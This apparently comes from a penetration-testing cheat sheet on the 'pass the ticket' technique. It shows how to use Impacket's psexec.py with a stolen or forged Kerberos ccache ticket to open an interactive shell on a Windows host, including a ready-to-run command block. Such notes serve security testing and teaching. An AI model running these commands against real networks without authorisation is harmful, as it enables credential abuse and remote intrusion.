# Pass The Ticket

* Impacket’s `psexec.py` offers `psexec` like functionality. This will give you an interactive shell on the Windows host. `psexec.py` also allows using Service Tickets, saved as a `ccache` file for Authentication. It can be obtained via Impacket’s `GetST.py`
* It is much easier to use variables&#x20;

```
target=10.10.10.1
domain=test.local
username=john
export KRB5CCNAME=/full/path/to/john.ccache
python3 psexec.py $domain/$username@$target -k -no-pass
```
